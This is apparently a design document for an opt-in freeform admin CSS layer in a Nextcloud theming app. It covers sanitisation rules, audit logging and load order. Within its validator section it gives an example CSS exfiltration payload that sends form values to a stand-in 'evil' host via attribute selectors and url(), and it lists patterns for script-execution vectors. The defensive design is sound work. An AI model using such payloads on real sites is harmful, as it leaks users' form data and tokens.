## Context

`custom-css-overrides` (`status: done`) gives admins a constrained **token editor**: it writes a
single `:root { --color-*: ...; }` block to `css/custom-overrides.css`. `CustomOverridesService`
validates every token *name* against `TokenRegistry` and `buildDeclarationLines()` rejects any value
containing `{`, `}`, `;`, or comment delimiters — the file can never contain a selector, a media
query, or a second declaration block. That constraint is what lets the token editor UI round-trip
the file safely (`CssParserService::parseRootBlock()` assumes exactly one `:root` block).

Admins periodically need more than a token can express — a component's `border-radius`, a
`@media (max-width: ...)` tweak, a one-off class override for a screen no token reaches. This design
adds a second, independent layer for that: `css/custom-css.css`, holding admin-authored freeform
CSS, loaded after `custom-overrides.css` so admin intent wins the cascade over both the token editor
and every design-system layer beneath it.

Unlike the token editor, freeform CSS text cannot be validated by checking names against a registry
— it is arbitrary selectors, properties, and values. The validation surface is therefore
fundamentally different (structural/pattern-based, not enumerable), which is why this is scoped as
its own capability with its own file, its own service, and its own spec, rather than an extension of
`custom-css-overrides`.

## Goals / Non-Goals

**Goals:**
- Let an admin author arbitrary CSS rules that are persisted, sanitised, loaded last, and take effect
  without a code deploy.
- Keep the feature off by default and inert (zero footprint) until an admin explicitly opts in.
- Make the sanitisation rules independently unit-testable, with no HTTP/Nextcloud bootstrap required.
- Prevent the freeform layer from being usable to exfiltrate data, execute script, or corrupt the
  Nextcloud dark-mode variable contract (REQ-CSS-007).
- Every save is audited via the existing `ThemingAuditService` — this is a delegated-admin-reachable
  surface (see Decision: Auth below), so the audit trail is the only record of who introduced what.

**Non-Goals:**
- A visual/live CSS editor, syntax highlighting, or autocompletion — a plain `<textarea>` matching
  the existing vanilla-JS admin UI is sufficient for this change.
- Per-selector or per-property fine-grained permissions — the flag is instance-wide on/off, matching
  every other nldesign admin toggle (`hide_slogan`, `show_menu_labels`).
- A full CSS parser/AST. Sanitisation is pattern-based (regex + a brace-balance scan), matching the
  precedent set by `CustomOverridesService::buildDeclarationLines()`'s own regex-based rejection —
  not a guarantee that the output is spec-valid CSS, only that it cannot carry the specific attack
  classes enumerated below.
- Preventing an admin from breaking their *own* instance's visual design with a badly written rule
  (e.g. `* { display: none; }`). That is the feature working as intended — the admin asked for
  freeform control. Only the specific invariants below (script execution, exfiltration, the
  REQ-CSS-007 variable set, structural corruption of the cascade) are enforced.

## Decisions

### 1. Separate file: `css/custom-css.css`, not `custom-overrides.css`
Overloading `custom-overrides.css` would break the `custom-css-overrides` spec's `File Format`
requirement (single `:root` block, no other selectors, no media queries) and the token editor's
round-trip parser, which assumes that shape unconditionally. A second file keeps both write paths,
both sanitisation regimes, and both specs independently correct and testable. `CustomCssService`
mirrors `CustomOverridesService`'s file-handling shape (temp-file + rename atomic write,
`ensureExists()`/ ensure-absent-is-safe semantics, `ensureFileExists()` not required — see Decision 3)
so the two services stay consistent for future readers even though they don't share code.

### 2. Load order: emitted immediately after `custom-overrides`
`CssInjectionService::inject()` already emits `custom-overrides` as step 4 (around the
`// 4. Custom overrides — admin-defined token overrides, always loaded last.` comment). This change
adds a new step 4b directly after it: `if custom_css_enabled: ensureExists(); emitStyle('custom-css')`.
Placing it after `custom-overrides` and before every later step (fonts, conditional stylesheets,
preview banner) means:
- Freeform CSS can override token-editor output — the more powerful, more dangerous layer sits
  last, which is the correct trust ordering (most-trusted-intent-wins).
- It does **not** sit after the preview-banner injection (step 6), because the preview banner is a
  transient, per-request admin-only UI overlay, not part of the persistent themed cascade — freeform
  CSS styling it would be surprising and is out of scope.

### 3. Off by default: `custom_css_enabled` appconfig flag
`IConfig::getAppValue('nldesign', 'custom_css_enabled', '0')`, read once per `inject()` call exactly
like `hide_slogan`/`show_menu_labels`. When `'0'` (default), `CssInjectionService` skips both
`ensureExists()` and `emitStyle()` — no file is created, no `<link>`/`<style>` tag is emitted, byte-
identical to today's output. When enabled with an empty or absent file, `emitStyle()` still runs
(mirroring `custom-overrides.css`'s "missing file does not break stack" scenario) — Nextcloud's
`Util::addStyle()` degrades to a 404'd stylesheet request in that edge case, exactly as
`custom-overrides.css` already does today when deleted mid-session, so this is existing, accepted
behavior, not a new risk. `CustomCssService::ensureExists()` writes a header-comment-only file (no
`:root` wrapper, since freeform content is not scoped to one selector) so the common case never hits
that edge.

### 4. Auth: `#[AuthorizedAdminSetting(Admin::class)]`, with a documented delegated-admin caveat
Matches `OverridesController`'s existing endpoints and the same `Admin` settings class. `Admin`
implements `IDelegatedSettings` (`lib/Settings/Admin.php`) — Nextcloud's theming-delegation feature
lets a *delegated* admin (a user granted access to specific settings sections, not a full instance
admin) reach every `#[AuthorizedAdminSetting(Admin::class)]` endpoint, including this one. A
delegated admin therefore gets **script-execution-adjacent CSS authoring power** at a lower trust
tier than a full admin — this is materially higher-stakes than the token editor's enumerable
`--color-*` values, which is why:
- Every save (and every enable/disable toggle flip) MUST call `ThemingAuditService::log()` with the
  acting user's uid (already captured via `IUserSession` inside the audit service) and a diff/hash of
  old vs. new content — mirroring `OverridesController::setOverrides()`'s `overrides_written` audit
  entry. This is the accountability control given that delegated admins are in scope.
- Sanitisation (Decision 5) is fail-closed and cannot be bypassed by delegated-admin status — there
  is no "full admin only" escape hatch in this change. If a future change wants one, it needs its own
  spec.

### 5. Sanitisation: `CustomCssValidator`, a standalone, unit-testable service
New `lib/Service/CustomCssValidator.php`, structured like `FontValidator`/`CustomTokenSetValidator`
(one method per check, so the hardening test corpus can assert exactly which rule fired). Comments
(`/* ... */`) and quoted string contents are stripped before pattern checks run, so a rule name
appearing only inside a CSS comment or a string literal doesn't false-positive — mirroring the
`s`-flag block-stripping already used by `CssParserService::parseDarkBlock()`. All checks run before
anything is validated logically. Validation is **fail-closed and all-or-nothing**: on any violation
the whole submission is rejected (HTTP 422) with a list naming every failed rule; nothing is ever
partially written. This differs from `CustomOverridesService`'s "unknown tokens silently ignored"
behavior deliberately — that pattern works because tokens are enumerable and dropping an unknown one
is harmless, but freeform CSS is unstructured text where auto-stripping a matched substring could
silently mangle an otherwise-safe rule (e.g. truncating mid-selector) and mislead the admin about
what was actually saved.

Rules enforced, in order:
1. **Size cap: 64 KB.** The admin types this by hand in a textarea (never uploaded as a file, unlike
   the token editor's 256 KB CSV/CSS import), so 64 KB (~1,500–2,000 lines of real CSS) comfortably
   covers legitimate component tweaks and several `@media` blocks while keeping the regex scans below
   bounded and fast (ReDoS-shaped inputs stay cheap at this size) and keeping any one
   `ThemingAuditService` JSONL entry from dominating its 1 MB-capped, rotating audit log.
2. **`@import` and `@charset`** — rejected anywhere in the text (`/@import\b/i`, `/@charset\b/i`).
   `@import` can fetch remote CSS (SSRF-adjacent from the browser, and a way to bypass every rule
   below via a second, unvalidated file); `@charset` has no legitimate use in an already-UTF-8-served
   fragment and historically enabled encoding-confusion XSS in some browsers.
3. **External `url(...)`** — rejected if the URL content matches an absolute scheme or
   protocol-relative form: `^\s*['"]?(?:[a-z][a-z0-9+.-]*:)?\/\//i` (catches `http://`, `https://`,
   `ftp://`, `//host/...`) or an explicit non-`data` scheme (`^\s*['"]?[a-z][a-z0-9+.-]*:(?!//)`,
   catches `javascript:`, `vbscript:`, etc.). **`data:` URIs and scheme-less relative/absolute paths
   (`url(../img/x.png)`, `url(/apps/nldesign/img/x.png)`) are permitted.** Rationale: `url()` in
   `background-image`, `@font-face src`, `cursor`, and `list-style-image` is a documented CSS
   exfiltration channel — combined with attribute selectors (`input[value^="a"] { background:
   url(https://evil/?a) }`) it can leak form values or CSRF tokens character-by-character to a
   third-party origin purely from CSS, no JS required. Restricting to same-origin/relative and `data:`
   removes the cross-origin leg of that attack: the browser only ever requests a resource the tenant
   already serves, or one embedded inline in the CSS text itself (which carries nothing the admin
   didn't already put there). This does not eliminate every same-origin risk (e.g. a timing side
   channel against the tenant's own server) but that is an accepted residual risk shared with every
   other same-origin resource reference an admin can already make.
4. **Script-execution vectors**: `expression\s*\(`, `behavior\s*:`, `-moz-binding\s*:` — legacy
   IE/Firefox CSS-to-script bridges. No legitimate use in a modern stack; rejected unconditionally.
5. **Breakout strings**: `</style`, `<script` (case-insensitive) — defense-in-depth against a
   render path that ever interpolates this content into HTML without a dedicated CSS content-type
   response (today's design always serves it via `Util::addStyle()`/a dedicated `text/css` endpoint,
   but this check is cheap insurance against a future regression).
6. **Reserved dark-mode variables (REQ-CSS-007)**: reject if the text contains a declaration of
   `--color-main-background`, `--color-main-background-rgb`, `--color-main-background-translucent`,
   `--color-main-background-blur`, `--color-background-plain`, `--background-invert-if-dark`, or
   `--background-invert-if-bright` — matched with `/--color-main-background(?:-rgb|-translucent|-blur)?\s*:/i`,
   `/--color-background-plain\s*:/i`, `/--background-invert-if-(?:dark|bright)\s*:/i`, checked against
   the **whole document, not just a `:root` block** (freeform CSS can declare a custom property inside
   any selector, and because this file loads last, any matching declaration risks winning the cascade
   regardless of selector specificity). This is enforcement, not documentation: the save is rejected
   with an error naming the specific reserved variable. It only blocks the *custom-property* vector —
   see Non-Goals for why a raw `body { background: ... }` override is explicitly out of scope for this
   check (that is the feature working as designed).
7. **Unbalanced braces**: after stripping comments and string contents, `{` and `}` counts must be
   equal, and the running count must never go negative. The whole file is emitted byte-for-byte after
   the header comment (`CssInjectionService` does not re-parse or re-serialize it), so a stray
   unmatched `{` would open a block that never closes and swallow every subsequent rule silently —
   this check turns that into a save-time error instead of a silent, hard-to-diagnose rendering bug.

### 6. New sibling controller: `CustomCssController`, not `OverridesController`
`OverridesController`'s four endpoints, its audit action names (`overrides_written`,
`overrides_imported`), and its existing test (`OverridesControllerAuditTest.php`) are scoped to the
token-override capability. Adding freeform-CSS endpoints there would mix two independent write paths
and two independent sanitisation regimes behind one class, and would force every future reader of
`OverridesController` to reason about both. A sibling `lib/Controller/CustomCssController.php`
(`getCustomCss` GET, `setCustomCss` POST — mirroring the existing naming convention) keeps the
capabilities as separable as their specs are. Both controllers depend on
`ThemingAuditService`/`Admin::class`, so the auth and audit posture stays identical without shared
code.

### 7. Service split: `CustomCssService` (I/O) + `CustomCssValidator` (rules)
Matches the existing split between `CustomOverridesService` (I/O, delegates registry checks to
`TokenRegistry`) and `TokenRegistry`/`CustomTokenSetValidator`/`FontValidator` elsewhere in the
codebase. `CustomCssService::write()` calls `CustomCssValidator::validate()` first and throws (or the
controller catches a typed exception) before any file I/O happens — validation has zero filesystem
side effects, so `CustomCssValidator` can be fully unit tested with plain strings in and a result
object out, no `IAppManager`/filesystem mocking required.

## Risks / Trade-offs

- **[Risk] A delegated (non-full) admin can author CSS with real attack-surface potential** →
  Mitigated by fail-closed sanitisation (Decision 5) applying identically regardless of admin tier,
  plus mandatory audit logging of every save (Decision 4) so misuse is at least attributable
  after the fact.
- **[Risk] Regex-based sanitisation is not a full CSS parser and can theoretically be evaded by
  sufficiently obscure CSS syntax** (nested comments inside strings, unusual whitespace/escapes) →
  Accepted, matching the precedent already set by `CustomOverridesService`'s own regex-based
  rejection; documented as a Non-Goal. The blocklist targets known, well-documented attack classes,
  not a hostile-input security boundary against a determined, sophisticated admin who is already
  a trusted (if delegated) principal.
- **[Risk] Same-origin `url()` still allows a same-origin exfiltration/probing channel** (Decision 5,
  rule 3) → Accepted; scoped down from cross-origin to same-origin, which removes the primary
  external-exfiltration threat model this feature is meant to guard against.
- **[Risk] An admin can still corrupt dark-mode visuals via a raw `background`/`color` declaration on
  a broad selector, bypassing the REQ-CSS-007 *variable* block** → Accepted and explicitly a
  Non-Goal: the enforced block only protects the shared derivation variables other components depend
  on; a targeted selector override only affects what the admin explicitly styled, which is the
  feature's intended blast radius.
- **[Trade-off] Fail-closed, all-or-nothing validation** means one bad rule blocks saving an
  otherwise-valid 500-line stylesheet → Accepted: the alternative (auto-stripping the offending
  fragment) risks silently mangling CSS structure and shipping something the admin never reviewed;
  the error list is designed to let the admin fix and resubmit in one pass.

## Migration Plan

No data migration — this is a new, off-by-default capability. Steps:
1. Ship `custom_css_enabled` defaulting to `'0'` — existing instances see zero behavior change on
   upgrade.
2. `css/custom-css.css` is created on first save (or on first `inject()` after the flag is switched
   on), never pre-seeded.
3. Rollback: disabling the flag (or downgrading the app) reverts the CSS stack to its current
   behavior immediately — `CssInjectionService` simply stops emitting the stylesheet; the file on
   disk is inert until re-enabled.

## Open Questions

None outstanding — provisional decisions above are recorded as `DEFERRED_QUESTIONS` in the change
summary for review.
